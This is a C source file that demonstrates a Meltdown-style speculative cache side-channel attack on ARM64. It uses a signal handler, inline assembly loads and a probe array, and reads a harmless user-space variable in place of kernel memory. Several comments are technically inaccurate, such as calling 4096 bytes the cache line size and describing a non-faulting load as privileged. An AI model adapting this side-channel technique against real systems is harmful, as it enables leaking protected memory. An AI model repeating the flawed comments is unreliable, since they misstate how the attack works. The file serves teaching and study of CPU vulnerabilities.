#include "utils_arm64.c"

// --- Meltdown (Rogue Data Cache Load) ---
// ARM64-compatible version

// The secret address we try to read from.
// In a real Meltdown, this would be a kernel address (e.g., kernel data, page tables).
// For demonstration, we use a global variable to simulate a "privileged" address
// that our fault handler will intercept before it crashes.
volatile uint8_t secret_meltdown_byte = 'M';
volatile uint8_t *g_secret_address_meltdown = &secret_meltdown_byte;

static sigjmp_buf jmpbuf_meltdown;

void sigsegv_handler_meltdown(int sig)
{
    // When a SIGSEGV occurs, jump back to where sigsetjmp was called.
    // This allows the program to continue after the fault, but only
    // after the speculative execution has already occurred.
    siglongjmp(jmpbuf_meltdown, 1);
}

int main_meltdown()
{
    common_init();
    printf("\n--- Running Meltdown (Rogue Data Cache Load) Demo ---\n");

    // Set up signal handler to catch segmentation faults
    if (signal(SIGSEGV, sigsegv_handler_meltdown) == SIG_ERR)
    {
        perror("signal");
        return 1;
    }

    printf("Attempting Meltdown-style transient read...\n");

    // Loop for multiple attempts to improve success rate
    for (int attempt = 0; attempt < 500; ++attempt)
    {
        flush_probe_array(); // Clear probe array before each attempt

        // Set up the "faulting" read
        // The sigsetjmp macro saves the current program state.
        // If a SIGSEGV occurs during the try-block, siglongjmp will jump here.
        if (sigsetjmp(jmpbuf_meltdown, 1) == 0)
        {
            // The critical part: a speculative load from a privileged address.
            // On a real system, 'g_secret_address_meltdown' would point to a kernel page.
            // The CPU speculatively loads from it, even though architecturally
            // it's forbidden and will fault.

            // ARM64 assembly for the precise Meltdown trigger:
            __asm__ __volatile__(
                "ldr x0, [%0]\n\t"                                 // Speculatively load from 'g_secret_address_meltdown' into X0
                                                                   // This is the faulting/privileged access
                "lsl x0, x0, #12\n\t"                              // Shift X0 (leaked byte) by cache line size (2^12 = 4096)
                "ldr x1, [%1, x0]\n"                               // Access probe_array[leaked_byte * CACHE_LINE_SIZE]
                                                                   // 'x1' receives some data from the probe array
                :                                                  // No output operands for this inline assembly block
                : "r"(g_secret_address_meltdown), "r"(probe_array) // Input operands
                : "x0", "x1"                                       // Clobbered registers
            );

            // This line would not be reached if it were a true, unhandled fault.
            // It's here to ensure compilation if the above asm fails or is empty.
            volatile uint8_t dummy_read = *(g_secret_address_meltdown); // This would cause a SIGSEGV.
        }
        else
        {
            // This block is executed after the SIGSEGV and longjmp.
            // The fault occurred, but speculative execution may have already filled the cache.
            arm64_lfence(); // Important fence to ensure speculative store completes before measurement
        }

        // --- Measurement Phase ---
        if (perform_measurement(secret_meltdown_byte, "Meltdown secret"))
        {
            return 0; // Exit on success
        }
    }

    printf("Failed to leak the Meltdown secret byte.\n");
    printf("Actual secret data: %c\n", secret_meltdown_byte);
    return 0;
}

int main()
{
    return main_meltdown();
}